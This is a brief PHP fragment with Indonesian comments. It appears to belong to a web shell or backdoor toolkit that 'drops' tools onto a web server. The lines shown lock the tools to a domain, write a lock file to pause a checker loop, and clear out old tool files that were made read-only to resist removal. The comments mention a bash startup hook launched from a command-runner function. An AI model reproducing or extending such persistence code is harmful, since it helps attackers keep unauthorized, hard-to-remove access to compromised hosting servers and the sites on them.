    $doc = dirname(__FILE__);
    $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $host = isset($_SERVER['HTTP_HOST']) ? trim(strval($_SERVER['HTTP_HOST'])) : '';
    $domain = strtolower(preg_replace('/:[0-9]+$/', '', $host));
    if ($domain === '') $log[] = '[!] HTTP_HOST kosong — domain-lock mengunci file ke host kosong (jalankan lewat browser)';
    /* kunci loop dtools checker selama drop (rc hook bash -l dari fum_run_cmd
       bisa memicu checker bersamaan dengan request ini) */
    @file_put_contents(gsp_dtlock_path(), '1');
    @chmod(gsp_dtlock_path(), 0600);
    /* bersihkan file lama (0444 -> chmod 0644 dulu supaya bisa dihapus);
       kandidat = state .gsfu_tools.dat + manifest dtools lama */
    $oldp = array();
